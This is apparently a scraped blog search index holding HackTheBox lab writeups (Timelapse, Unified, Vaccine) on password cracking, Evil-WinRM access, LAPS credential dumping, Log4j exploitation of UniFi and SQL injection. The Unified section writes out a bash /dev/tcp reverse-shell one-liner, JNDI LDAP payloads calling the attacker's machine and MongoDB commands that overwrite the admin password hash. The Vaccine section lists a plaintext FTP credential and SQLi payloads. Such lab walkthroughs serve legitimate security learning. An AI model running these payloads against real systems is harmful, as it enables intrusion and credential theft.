","date":"21-08-2022","objectID":"/posts/htb/timelapse/:2:1","tags":["ldap","ldapsearch","smb","smbclient","powershell-history","pfx-file","evil-winrm","crackmapexec","john","zip2john","pfx2john","group-laps_readers"],"title":"HackTheBox - Timelapse Writeup","uri":"/posts/htb/timelapse/"},{"categories":null,"content":"SMBclient Now, we already know that smb ports are open. Let’s try listing the shares by using smbclient. Surprisingly, it doesn’t require authentication for it. I just press Enter in the password prompt. ","date":"21-08-2022","objectID":"/posts/htb/timelapse/:2:2","tags":["ldap","ldapsearch","smb","smbclient","powershell-history","pfx-file","evil-winrm","crackmapexec","john","zip2john","pfx2john","group-laps_readers"],"title":"HackTheBox - Timelapse Writeup","uri":"/posts/htb/timelapse/"},{"categories":null,"content":"JohntheRipper: zip2john After checking the all shares. I finally found something that looks interesting. I found the winrm_backup.zip file in \\Shares\\Dev\\. Let’s download it, into our attack machine with the get command. Now, it’s time to unzip the file. However, it is protected by a password and I don’t know, what the password is. So, I’m gonna run zip2john to crack the zip file with rockyou.txt as a wordlist. ","date":"21-08-2022","objectID":"/posts/htb/timelapse/:3:0","tags":["ldap","ldapsearch","smb","smbclient","powershell-history","pfx-file","evil-winrm","crackmapexec","john","zip2john","pfx2john","group-laps_readers"],"title":"HackTheBox - Timelapse Writeup","uri":"/posts/htb/timelapse/"},{"categories":null,"content":"*.PFX file Finally, the wait pay off. We’ve got the password and it’s time to crack it open. Well, it just contains one file called legacyy_dev_auth.pfx. I never heard of the extensions called pfx before, and with quick googling. It says: The .pfx file, which is in a PKCS#12 format, contains the SSL certificate (public keys) and the corresponding private keys. ","date":"21-08-2022","objectID":"/posts/htb/timelapse/:4:0","tags":["ldap","ldapsearch","smb","smbclient","powershell-history","pfx-file","evil-winrm","crackmapexec","john","zip2john","pfx2john","group-laps_readers"],"title":"HackTheBox - Timelapse Writeup","uri":"/posts/htb/timelapse/"},{"categories":null,"content":"JohntheRipper: pfx2john The pfx file it’s just a binary that compiles with public and private keys. Now, what we need is, to extract the keys from it. I manage found an article that shows us 'How to extract it'. Here’s the article. First, we need to extract the private key by using openssl. Unfortunately, its needed the password. I already try the password that we found earlier and it doesn’t work. Now, I’m gonna run the file against pfx2john to produce the hash and crack it with john. ","date":"21-08-2022","objectID":"/posts/htb/timelapse/:4:1","tags":["ldap","ldapsearch","smb","smbclient","powershell-history","pfx-file","evil-winrm","crackmapexec","john","zip2john","pfx2john","group-laps_readers"],"title":"HackTheBox - Timelapse Writeup","uri":"/posts/htb/timelapse/"},{"categories":null,"content":"Extracting the cert from *.PFX file Nice! we finally managed to retrieve the pfx file password. Let’s try to extract the keys one more time. Here’s an article for reference. Let me breaks down into three parts real quick. The first command is basically to extract the encrypted private key Run the next following command to extract the certificate/public key The final command, it’s just decrypted the private key NOTE: you will be prompted to type the import password. Type the password you found earlier by using pfx2john ","date":"21-08-2022","objectID":"/posts/htb/timelapse/:4:2","tags":["ldap","ldapsearch","smb","smbclient","powershell-history","pfx-file","evil-winrm","crackmapexec","john","zip2john","pfx2john","group-laps_readers"],"title":"HackTheBox - Timelapse Writeup","uri":"/posts/htb/timelapse/"},{"categories":null,"content":"Evil-WinRM: legacyy Based on the zip file name 'winrm_backup.zip'. I guess this might be something to do with winrm, and the Nmap scan result also shows us that port 5986 is open. Let’s try connecting to it with Evil-WinRM and make sure to enable ssl with the -S tag. I’m gonna use the keys we discovered with -c for the public key and -k for a private key. Finally, I’m in as a legacyy user. ","date":"21-08-2022","objectID":"/posts/htb/timelapse/:5:0","tags":["ldap","ldapsearch","smb","smbclient","powershell-history","pfx-file","evil-winrm","crackmapexec","john","zip2john","pfx2john","group-laps_readers"],"title":"HackTheBox - Timelapse Writeup","uri":"/posts/htb/timelapse/"},{"categories":null,"content":"Powershell History So, I’ll try to run the winpeas. Unfortunately, it doesn’t execute because the Anti-Virus program managed to catch it and throws this error file contains a virus or potentially unwanted software. Honestly, I am stuck on this machine. Then, I realized, I never check the powershell history and I felt guilty because that file has always been ignored by me. To my surprise, I found something useful yet interesting in the powershell history file. type $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt ","date":"21-08-2022","objectID":"/posts/htb/timelapse/:5:1","tags":["ldap","ldapsearch","smb","smbclient","powershell-history","pfx-file","evil-winrm","crackmapexec","john","zip2john","pfx2john","group-laps_readers"],"title":"HackTheBox - Timelapse Writeup","uri":"/posts/htb/timelapse/"},{"categories":null,"content":"Evil-WinRM: svc_deploy Well, in the history file contains svc_deploy user credentials and lead us into port 5986 once again. Let’s connect to the machine as svc_deploy user with the credentials we just found. Success! ","date":"21-08-2022","objectID":"/posts/htb/timelapse/:6:0","tags":["ldap","ldapsearch","smb","smbclient","powershell-history","pfx-file","evil-winrm","crackmapexec","john","zip2john","pfx2john","group-laps_readers"],"title":"HackTheBox - Timelapse Writeup","uri":"/posts/htb/timelapse/"},{"categories":null,"content":"Group: LAPS_Readers Let’s check this user “background” with the net user command. Turns out, this user is part of LAPS_Readers Global Group memberships. Honestly, I didn’t even know what it is, but it sounds cool :p with a quick search on the net. It says: The “Local Administrator Password Solution” (LAPS) provides management of local account passwords of domain-joined computers. Passwords are stored in Active Directory (AD) and protected by ACL, so only eligible users can read them or request its reset. ","date":"21-08-2022","objectID":"/posts/htb/timelapse/:6:1","tags":["ldap","ldapsearch","smb","smbclient","powershell-history","pfx-file","evil-winrm","crackmapexec","john","zip2john","pfx2john","group-laps_readers"],"title":"HackTheBox - Timelapse Writeup","uri":"/posts/htb/timelapse/"},{"categories":null,"content":"LDAPsearch The excited part of it. We can read the password stored in Active Directory. The last time I checked, this is an AD machine. So, I manage to find an article that’s about credentials dumping. I already try used crackmapexec and it just threw a bunch of errors at me. So, I end up using ldapsearch. Let’s dump the administrator credentials. ","date":"21-08-2022","objectID":"/posts/htb/timelapse/:6:2","tags":["ldap","ldapsearch","smb","smbclient","powershell-history","pfx-file","evil-winrm","crackmapexec","john","zip2john","pfx2john","group-laps_readers"],"title":"HackTheBox - Timelapse Writeup","uri":"/posts/htb/timelapse/"},{"categories":null,"content":"Evil-WinRM: administrator We successfully retrieve the administrator credentials. Let’s try connect to evil-winrm. *CHEF KISS* Beautiful ","date":"21-08-2022","objectID":"/posts/htb/timelapse/:7:0","tags":["ldap","ldapsearch","smb","smbclient","powershell-history","pfx-file","evil-winrm","crackmapexec","john","zip2john","pfx2john","group-laps_readers"],"title":"HackTheBox - Timelapse Writeup","uri":"/posts/htb/timelapse/"},{"categories":null,"content":"Nmap As always, I’m gonna run the Nmap scan against this machine IP address. The scan already completed. Here is the result. ","date":"19-02-2022","objectID":"/posts/htb/unified/:1:0","tags":["CVE-2021-44228","unifi-6.4.54","log4j","tcpdump","rogue-jndi","mongodb-checking-is-running","mongodb-dump","mongodb-update","generate-sha512-hash","upgrade-shell-using-script"],"title":"HackTheBox - Unified Writeup","uri":"/posts/htb/unified/"},{"categories":null,"content":"the result # Nmap 7.92 scan initiated Fri Feb 18 13:10:18 2022 as: nmap -sC -sV -oN nmap/unified 10.129.96.149 Nmap scan report for 10.129.96.149 Host is up (0.22s latency). Not shown: 996 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 6789/tcp open ibm-db2-admin? 8080/tcp open http-proxy | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 404 | Content-Type: text/html;charset=utf-8 | Content-Language: en | Content-Length: 431 | Date: Fri, 18 Feb 2022 05:21:57 GMT | Connection: close | \u003c!doctype html\u003e\u003chtml lang=\"en\"\u003e\u003chead\u003e\u003ctitle\u003eHTTP Status 404 | Found\u003c/title\u003e\u003cstyle type=\"text/css\"\u003ebody {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}\u003c/style\u003e\u003c/head\u003e\u003cbody\u003e\u003ch1\u003eHTTP Status 404 | Found\u003c/h1\u003e\u003c/body\u003e\u003c/html\u003e | GetRequest, HTTPOptions: | HTTP/1.1 302 | Location: http://localhost:8080/manage | Content-Length: 0 | Date: Fri, 18 Feb 2022 05:21:56 GMT | Connection: close | RTSPRequest: | HTTP/1.1 400 | Content-Type: text/html;charset=utf-8 | Content-Language: en | Content-Length: 435 | Date: Fri, 18 Feb 2022 05:21:56 GMT | Connection: close | \u003c!doctype html\u003e\u003chtml lang=\"en\"\u003e\u003chead\u003e\u003ctitle\u003eHTTP Status 400 | Request\u003c/title\u003e\u003cstyle type=\"text/css\"\u003ebody {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}\u003c/style\u003e\u003c/head\u003e\u003cbody\u003e\u003ch1\u003eHTTP Status 400 | Request\u003c/h1\u003e\u003c/body\u003e\u003c/html\u003e | Socks5: | HTTP/1.1 400 | Content-Type: text/html;charset=utf-8 | Content-Language: en | Content-Length: 435 | Date: Fri, 18 Feb 2022 05:21:57 GMT | Connection: close | \u003c!doctype html\u003e\u003chtml lang=\"en\"\u003e\u003chead\u003e\u003ctitle\u003eHTTP Status 400 | Request\u003c/title\u003e\u003cstyle type=\"text/css\"\u003ebody {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}\u003c/style\u003e\u003c/head\u003e\u003cbody\u003e\u003ch1\u003eHTTP Status 400 |_ Request\u003c/h1\u003e\u003c/body\u003e\u003c/html\u003e |_http-title: Did not follow redirect to https://10.129.96.149:8443/manage |_http-open-proxy: Proxy might be redirecting requests 8443/tcp open ssl/nagios-nsca Nagios NSCA | http-title: UniFi Network |_Requested resource was /manage/account/login?redirect=%2Fmanage | ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US | Subject Alternative Name: DNS:UniFi | Not valid before: 2021-12-30T21:37:24 |_Not valid after: 2024-04-03T21:37:24 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8080-TCP:V=7.92%I=7%D=2/18%Time=620F2A45%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,84,\"HTTP/1\\.1\\x20302\\x20\\r\\nLocation:\\x20http://localhost:8080 SF:/manage\\r\\nContent-Length:\\x200\\r\\nDate:\\x20Fri,\\x2018\\x20Feb\\x202022\\x SF:2005:21:56\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(HTTPOptions,84,\"H SF:TTP/1\\.1\\x20302\\x20\\r\\nLocation:\\x20http://localhost:8080/manage\\r\\nCon SF:tent-Length:\\x200\\r\\nDate:\\x20Fri,\\x2018\\x20Feb\\x202022\\x2005:21:56\\x20 SF:GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(RTSPRequest,24E,\"HTTP/1\\.1\\x204 SF:00\\x20\\r\\nContent-Type:\\x20text/html;charset=utf-8\\r\\nContent-Language: SF:\\x20en\\r\\nContent-Length:\\x20435\\r\\nDate:\\x20Fri,\\x2018\\x20Feb\\x202022\\ SF:x2005:21:56\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\u003c!doctype\\x20html\u003e\u003cht SF:ml\\x20lang=\\\"en\\\"\u003e\u003chead\u003e","date":"19-02-2022","objectID":"/posts/htb/unified/:1:1","tags":["CVE-2021-44228","unifi-6.4.54","log4j","tcpdump","rogue-jndi","mongodb-checking-is-running","mongodb-dump","mongodb-update","generate-sha512-hash","upgrade-shell-using-script"],"title":"HackTheBox - Unified Writeup","uri":"/posts/htb/unified/"},{"categories":null,"content":"port 8080 The Nmap scan result shows port 8080 is open. It is the http-proxy let’s navigate to the port. However, it redirects me to this link https://10.129.96.149:8443/manage/account/login?redirect=%2Fmanage ","date":"19-02-2022","objectID":"/posts/htb/unified/:2:0","tags":["CVE-2021-44228","unifi-6.4.54","log4j","tcpdump","rogue-jndi","mongodb-checking-is-running","mongodb-dump","mongodb-update","generate-sha512-hash","upgrade-shell-using-script"],"title":"HackTheBox - Unified Writeup","uri":"/posts/htb/unified/"},{"categories":null,"content":"unifi - 6.4.54 Well, it is just a login page. The first thing I do is try to put some simple credentials such as admin:admin, admin:password, etc. Unfortunately, I can’t get access to it but this page also has the version displayed in front of it. With quick googling, I have found this. sprocketsecurity - another log4j on the fire unifi. Turns out this version, is on fire with the new vulnerability from the java logging library, Log4j - CVE-2021-44228 ","date":"19-02-2022","objectID":"/posts/htb/unified/:3:0","tags":["CVE-2021-44228","unifi-6.4.54","log4j","tcpdump","rogue-jndi","mongodb-checking-is-running","mongodb-dump","mongodb-update","generate-sha512-hash","upgrade-shell-using-script"],"title":"HackTheBox - Unified Writeup","uri":"/posts/htb/unified/"},{"categories":null,"content":"exploit In the article, it says: The vulnerability is in the remember (or in some versions the username) value issued in the login request. shown below: POST /api/login HTTP/2 Host: \u003cTARGET\u003e Content-Length: 109 Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\" Sec-Ch-Ua-Mobile: ?0 User-Agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Sec-Ch-Ua-Platform: \"macOS\" Content-Type: application/json; charset=utf-8 Accept: */* Origin: https://\u003cTARGET\u003e Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: https://\u003cTARGET\u003e/manage/account/login?redirect=%2Fmanage Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 {\"username\":\"asdf\",\"password\":\"asdfas\",\"remember\":\"\u003cPAYLOAD\u003e\",\"strict\":true} ","date":"19-02-2022","objectID":"/posts/htb/unified/:4:0","tags":["CVE-2021-44228","unifi-6.4.54","log4j","tcpdump","rogue-jndi","mongodb-checking-is-running","mongodb-dump","mongodb-update","generate-sha512-hash","upgrade-shell-using-script"],"title":"HackTheBox - Unified Writeup","uri":"/posts/htb/unified/"},{"categories":null,"content":"how to test it is vulnerable to log4j I find a way easier method to test it in the official walkthrough that you can download. Does it mean I’m not trying it and just reading it? Well, if you have that perception. Here is the blog post talking about that. This blog is written by two talented person ippsec \u0026 0xdf Enough with all that, Let’s test it. First I’m gonna fire up the burpsuite to intercept the /api/login endpoint. So, I can alter the request to be specific the \"remember\" parameter. Now, I need to put this payload : ${jndi:ldap://Tun0 IP Address/test} JNDI (Java Naming and Directory Interface API). By making calls to this API, applications locate resources and other program objects. LDAP (Lightweight Directory Access Protocol) The default port that LDAP runs on is port 389. ","date":"19-02-2022","objectID":"/posts/htb/unified/:5:0","tags":["CVE-2021-44228","unifi-6.4.54","log4j","tcpdump","rogue-jndi","mongodb-checking-is-running","mongodb-dump","mongodb-update","generate-sha512-hash","upgrade-shell-using-script"],"title":"HackTheBox - Unified Writeup","uri":"/posts/htb/unified/"},{"categories":null,"content":"tcpdump Before sending the payload. First, let’s set up the monitoring network on port 389 with tcpdump. This tool will let us monitor the network traffic/dump the network. So, open up another terminal and type: sudo tcpdump -i tun0 port 389 After the tcpdump has been started, click the Send button. The tcpdump output shows a connection being received on my machine. This proves that the application is vulnerable since it is trying to connect on the LDAP port 389. ","date":"19-02-2022","objectID":"/posts/htb/unified/:6:0","tags":["CVE-2021-44228","unifi-6.4.54","log4j","tcpdump","rogue-jndi","mongodb-checking-is-running","mongodb-dump","mongodb-update","generate-sha512-hash","upgrade-shell-using-script"],"title":"HackTheBox - Unified Writeup","uri":"/posts/htb/unified/"},{"categories":null,"content":"Rogue JNDI Rogue JNDI is a malicious LDAP server for JNDI injection attacks. This will help me to receive connections back and execute malicious code. First, let’s clone the Github repos of this application. git clone https://github.com/veracode-research/rogue-jndi The rogue-jndi is a Java application. In the official walkthrough. It says we need to install Open-JDK \u0026 Maven on our system to build the payload. However, if you’re using the Linux hacking distribution such as parrot os \u0026 kali. You might have already installed it in those systems but if you don’t. Type this to install it make sure to run it with sudo privilege. sudo apt update # update the package sudo apt install openjdk-11-jdk -y # install open-jdk sudo apt install maven # install maven After all, is done, let’s build the Rogue-JNDI Java application. cd rogue-jndi \u0026\u0026 mvn package ","date":"19-02-2022","objectID":"/posts/htb/unified/:7:0","tags":["CVE-2021-44228","unifi-6.4.54","log4j","tcpdump","rogue-jndi","mongodb-checking-is-running","mongodb-dump","mongodb-update","generate-sha512-hash","upgrade-shell-using-script"],"title":"HackTheBox - Unified Writeup","uri":"/posts/htb/unified/"},{"categories":null,"content":"create a reverse shell payload This will create a .jar file in rogue-jndi/target/ directory called RogueJndi-1.1.jar. Before we can run the application. We need to create our reverse shell payload first and encode it with base64 to prevent any encoding issues. ➜ echo 'bash -c bash -i \u003e\u0026 /dev/tcp/Tun0 IP/Port 0\u003e\u00261' | base64 YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwL1R1bjAgSVAvUG9ydCAwPiYxCg== ","date":"19-02-2022","objectID":"/posts/htb/unified/:8:0","tags":["CVE-2021-44228","unifi-6.4.54","log4j","tcpdump","rogue-jndi","mongodb-checking-is-running","mongodb-dump","mongodb-update","generate-sha512-hash","upgrade-shell-using-script"],"title":"HackTheBox - Unified Writeup","uri":"/posts/htb/unified/"},{"categories":null,"content":"rogue-jndi arguments After the payload had been created, start the Rogue-JNDI application with these arguments. Example down below; Make sure to run the Netcat listener on your desire/reverse_shell port to catch the connection back. ➜ java -jar rogue-jndi/target/RogueJndi-1.1.jar --command \"bash -c {echo,BASE64 STRING}|{base64,-d}|{bash,-i}\" --hostname \"Tun0 IP Address\" Going back to burpsuite. Let’s intercept the requests once more but this time the payload going to be this instead; After the payload is already set in place. Now, just click a single button it is the Send button \u0026 BINGO! ${jndi:ldap://Tun0 IP Address:1389/o=tomcat} ","date":"19-02-2022","objectID":"/posts/htb/unified/:9:0","tags":["CVE-2021-44228","unifi-6.4.54","log4j","tcpdump","rogue-jndi","mongodb-checking-is-running","mongodb-dump","mongodb-update","generate-sha512-hash","upgrade-shell-using-script"],"title":"HackTheBox - Unified Writeup","uri":"/posts/htb/unified/"},{"categories":null,"content":"upgrade shell using script type this command to upgrade shell: script /dev/null -c bash ","date":"19-02-2022","objectID":"/posts/htb/unified/:10:0","tags":["CVE-2021-44228","unifi-6.4.54","log4j","tcpdump","rogue-jndi","mongodb-checking-is-running","mongodb-dump","mongodb-update","generate-sha512-hash","upgrade-shell-using-script"],"title":"HackTheBox - Unified Writeup","uri":"/posts/htb/unified/"},{"categories":null,"content":"mongoDB In this article sprocketsecurity - another log4j on the fire unifi. it says the MongoDB instance storing all application is listening on localhost without authentication. This means we can extract the password, alter the data, add our password to it, etc. ","date":"19-02-2022","objectID":"/posts/htb/unified/:11:0","tags":["CVE-2021-44228","unifi-6.4.54","log4j","tcpdump","rogue-jndi","mongodb-checking-is-running","mongodb-dump","mongodb-update","generate-sha512-hash","upgrade-shell-using-script"],"title":"HackTheBox - Unified Writeup","uri":"/posts/htb/unified/"},{"categories":null,"content":"checking mongoDB is running Just type this command on the victim machine. The output shows us MongoDB is running on the victim machine on port 27117. ps aux | grep mongo Well, in the article sprocketsecurity - another log4j on the fire unifi it talks about cracking the password hash and adding our x_shadow admin but in the official walkthrough did a kinda similar thing but in a more simple way. In this case, you can learn every way to interact or alter the data in MongoDB. I already trying them both but in this writeup, I choose the official walkthrough way to make it not a super long writeup. In the sprocketsecurity - another log4j on the fire unifi article. I saw that they interact with the UniFi database called ace. So, I’m thinking let’s try it with the ace database and that’s the correct DB name. ace is the default UniFi database ","date":"19-02-2022","objectID":"/posts/htb/unified/:12:0","tags":["CVE-2021-44228","unifi-6.4.54","log4j","tcpdump","rogue-jndi","mongodb-checking-is-running","mongodb-dump","mongodb-update","generate-sha512-hash","upgrade-shell-using-script"],"title":"HackTheBox - Unified Writeup","uri":"/posts/htb/unified/"},{"categories":null,"content":"dump user/password from mongoDB We already know MongoDB exist in victim machine. Now, we can dump user/password from it with this command: mongo --port 27117 ace --eval \"db.admin.find().forEach(printjson)\" After we press Enter. The output is so ridiculous its dumps all users, email, password hash, etc. The most important data we want to take a look at is administrator. ","date":"19-02-2022","objectID":"/posts/htb/unified/:13:0","tags":["CVE-2021-44228","unifi-6.4.54","log4j","tcpdump","rogue-jndi","mongodb-checking-is-running","mongodb-dump","mongodb-update","generate-sha512-hash","upgrade-shell-using-script"],"title":"HackTheBox - Unified Writeup","uri":"/posts/htb/unified/"},{"categories":null,"content":"change administrator x_shadow So, as I said before, I’m gonna use the official walkthrough way to change administrator x_shadow but again it is up to you. How you want to approach it. Well, the first thing we want to do is generate a sha-512 hash. To do this we can use the mkpasswd command-line utility. So, the command should look like this: ","date":"19-02-2022","objectID":"/posts/htb/unified/:14:0","tags":["CVE-2021-44228","unifi-6.4.54","log4j","tcpdump","rogue-jndi","mongodb-checking-is-running","mongodb-dump","mongodb-update","generate-sha512-hash","upgrade-shell-using-script"],"title":"HackTheBox - Unified Writeup","uri":"/posts/htb/unified/"},{"categories":null,"content":"generate sha-512 hash mkpasswd -m sha-512 yourdesirepassword Let’s proceed to replacing the existing hash with one we created. To do it, type this command: mongo --port 27117 ace --eval 'db.admin.update({\"_id\":ObjectId(\"61ce278f46e0fb0012d47ee4\")},{$set:{\"x_shadow\":\"SHA-512 Hash Generated\"}})' Now, we need to verify that the password has been updated in the MongoDB by running the same command to dump the user/password. The hash appears to have been updated. ","date":"19-02-2022","objectID":"/posts/htb/unified/:15:0","tags":["CVE-2021-44228","unifi-6.4.54","log4j","tcpdump","rogue-jndi","mongodb-checking-is-running","mongodb-dump","mongodb-update","generate-sha512-hash","upgrade-shell-using-script"],"title":"HackTheBox - Unified Writeup","uri":"/posts/htb/unified/"},{"categories":null,"content":"login page Well, let’s try login with the username administrator and password to whatever you put it as the hash. In my case, it will be drjohn. DONE! ","date":"19-02-2022","objectID":"/posts/htb/unified/:16:0","tags":["CVE-2021-44228","unifi-6.4.54","log4j","tcpdump","rogue-jndi","mongodb-checking-is-running","mongodb-dump","mongodb-update","generate-sha512-hash","upgrade-shell-using-script"],"title":"HackTheBox - Unified Writeup","uri":"/posts/htb/unified/"},{"categories":null,"content":"steal SSH creds The Nmap scan result previously shows that port 22/SSH is open. To gain access through SSH we must need a valid credential. However, luck is on our side. We can grab ssh credentials by navigating to the setting page by clicking the bottom left button that looks like a gear. Then, scroll down. ","date":"19-02-2022","objectID":"/posts/htb/unified/:17:0","tags":["CVE-2021-44228","unifi-6.4.54","log4j","tcpdump","rogue-jndi","mongodb-checking-is-running","mongodb-dump","mongodb-update","generate-sha512-hash","upgrade-shell-using-script"],"title":"HackTheBox - Unified Writeup","uri":"/posts/htb/unified/"},{"categories":null,"content":"ssh as root Let’s log in as root with the creds we found. SUCCESS!!! ","date":"19-02-2022","objectID":"/posts/htb/unified/:18:0","tags":["CVE-2021-44228","unifi-6.4.54","log4j","tcpdump","rogue-jndi","mongodb-checking-is-running","mongodb-dump","mongodb-update","generate-sha512-hash","upgrade-shell-using-script"],"title":"HackTheBox - Unified Writeup","uri":"/posts/htb/unified/"},{"categories":null,"content":"Enumeration Top 1000 ports scan sudo nmap -sC -sV -oN nmap/initial 10.10.10.46 the result # Nmap 7.91 scan initiated Sat Jun 5 20:45:49 2021 as: nmap -sC -sV -oN nmap/initial 10.10.10.46 Nmap scan report for 10.10.10.46 Host is up (2.2s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA) | 256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA) |_ 256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: MegaCorp Login Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jun 5 20:49:09 2021 -- 1 IP address (1 host up) scanned in 199.30 seconds All ports scan sudo nmap -sC -sV -p- -oN nmap/all_ports 10.10.10.46 the result # Nmap 7.91 scan initiated Sun Jun 6 01:05:52 2021 as: nmap -sC -sV -p- -oN nmap/all_ports 10.10.10.46 Nmap scan report for 10.10.10.46 Host is up (0.28s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA) | 256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA) |_ 256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: MegaCorp Login Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Jun 6 01:34:04 2021 -- 1 IP address (1 host up) scanned in 1691.79 seconds The result of both this scan open ports 21 / ftp 22 / SSH 80 / http ","date":"21-07-2021","objectID":"/posts/htb/vaccine/:1:0","tags":["sqlmap","sql-union","GTFOBins"],"title":"HackTheBox - Vaccine Writeup","uri":"/posts/htb/vaccine/"},{"categories":null,"content":"FTP login with this credentials ftpuser:mc@F1l3ZilL4 this credentails found from previous machine called oopsie Found backup.zip file download the zip file ","date":"21-07-2021","objectID":"/posts/htb/vaccine/:2:0","tags":["sqlmap","sql-union","GTFOBins"],"title":"HackTheBox - Vaccine Writeup","uri":"/posts/htb/vaccine/"},{"categories":null,"content":"Zip2John the zip file is encrypted Time to use zip2john Direct the output from zip2john into file called backup.hash ","date":"21-07-2021","objectID":"/posts/htb/vaccine/:3:0","tags":["sqlmap","sql-union","GTFOBins"],"title":"HackTheBox - Vaccine Writeup","uri":"/posts/htb/vaccine/"},{"categories":null,"content":"John-The-Ripper[JtR] Use JtR to crack it found the password ","date":"21-07-2021","objectID":"/posts/htb/vaccine/:3:1","tags":["sqlmap","sql-union","GTFOBins"],"title":"HackTheBox - Vaccine Writeup","uri":"/posts/htb/vaccine/"},{"categories":null,"content":"Content of the ZipFile Unzip and got 2 files called index.php style.css Found the password in index.php turns out, it is md5 hash crack it using online tool crackstation.net ","date":"21-07-2021","objectID":"/posts/htb/vaccine/:3:2","tags":["sqlmap","sql-union","GTFOBins"],"title":"HackTheBox - Vaccine Writeup","uri":"/posts/htb/vaccine/"},{"categories":null,"content":"The Website Login with the password found in index.php file Assuming this is a database loaded several cars Try to insert ' in the search field and got this error ","date":"21-07-2021","objectID":"/posts/htb/vaccine/:4:0","tags":["sqlmap","sql-union","GTFOBins"],"title":"HackTheBox - Vaccine Writeup","uri":"/posts/htb/vaccine/"},{"categories":null,"content":"SQLmap Here is the syntax. Sqlmap also needed cookie for this to work sqlmap.py -u 'http://10.10.10.46/dashboard.php?search=sunny' --cookie=\"PHPSESSID=q14pc524upvp0hspqoh1n5nq8p\" --batch This server is using PostgreSQL database Sqlmap also found vulnerability can lead into injections ","date":"21-07-2021","objectID":"/posts/htb/vaccine/:4:1","tags":["sqlmap","sql-union","GTFOBins"],"title":"HackTheBox - Vaccine Writeup","uri":"/posts/htb/vaccine/"},{"categories":null,"content":"UNION select Source SQLinjection UNION attacks[PortSwigger] ","date":"21-07-2021","objectID":"/posts/htb/vaccine/:4:2","tags":["sqlmap","sql-union","GTFOBins"],"title":"HackTheBox - Vaccine Writeup","uri":"/posts/htb/vaccine/"},{"categories":null,"content":"Finding Columns for attack Finding how many columns for SQL injection attack By inserting this into search field: ' ORDER BY 1-- ' ORDER BY 2-- ' ORDER BY 3-- .. and so on. - Until you’ve found an error. ","date":"21-07-2021","objectID":"/posts/htb/vaccine/:4:3","tags":["sqlmap","sql-union","GTFOBins"],"title":"HackTheBox - Vaccine Writeup","uri":"/posts/htb/vaccine/"},{"categories":null,"content":"Python script However, I’m kinda lazy. So, I made python script for it. #!/usr/bin/env python3 import requests for i in range(1,100): url = f\"http://10.10.10.46/dashboard.php?search=' ORDER BY {i} --\" c = {'PHPSESSID':'lfbncgq98bat28uu4v3r4j2dnh'} r = requests.get(url, cookies=c) if len(r.content) == 2449: print(f\"Error Not Here {i}\") else: print(f\"Error Here {i}\") the result By looking at this result, we’ve found 5 columns. ","date":"21-07-2021","objectID":"/posts/htb/vaccine/:4:4","tags":["sqlmap","sql-union","GTFOBins"],"title":"HackTheBox - 